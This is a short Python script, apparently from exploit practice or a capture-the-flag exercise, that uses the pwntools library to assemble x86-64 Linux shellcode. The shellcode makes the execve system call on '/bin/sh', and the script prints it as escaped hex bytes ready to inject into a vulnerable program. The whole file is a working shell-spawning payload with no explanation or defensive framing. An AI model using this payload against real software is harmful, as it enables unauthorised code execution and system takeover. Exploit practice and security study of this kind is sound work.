#!/bin/python3

from pwn import *

shell = asm("""mov rax, 0x3b 
lea rdi, [rip+.binsh]
mov rsi, 0 
mov rdx, 0
syscall 
.binsh: .string "/bin/sh" """, arch='amd64', os='linux')

print("".join(f"\\x{i:02x}" for i in shell))
